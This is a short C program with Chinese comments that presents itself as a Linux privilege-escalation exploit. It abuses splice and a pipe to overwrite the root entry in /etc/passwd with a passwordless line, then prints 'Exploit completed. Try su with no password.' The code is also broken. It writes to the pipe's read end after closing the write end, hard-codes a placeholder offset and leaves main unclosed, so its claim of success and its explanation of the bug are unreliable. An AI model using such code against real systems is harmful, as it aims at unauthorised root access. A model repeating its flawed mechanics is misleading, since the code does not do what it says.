#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    // 打开/etc/passwd（只读即可，因为漏洞利用的是页缓存）
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    int p[2];
    if (pipe(p) < 0) { perror("pipe"); return 1; }

    // 使用splice将文件前4096字节读入pipe
    ssize_t n = splice(fd, NULL, p[1], NULL, 4096, 0);
    if (n < 0) { perror("splice"); return 1; }
    close(p[1]); // 关闭写端

    // 构造新root行：密码字段为空
    char *new_root_line = "root::0:0:root:/root:/bin/bash\n";
    // 计算需要覆盖的偏移（假设root行在文件开头）
    off_t offset = 0; // 实际需根据文件内容定位
    // 使用lseek调整pipe读端偏移？不，直接向pipe写数据会覆盖已读入的页面
    // 关键：向pipe读端写入数据，由于页面共享，会修改文件
    write(p[0], new_root_line, strlen(new_root_line));

    // 关闭文件描述符
    close(fd);
    close(p[0]);

    printf("Exploit completed. Try 'su' with no password.\n");
    return 0;
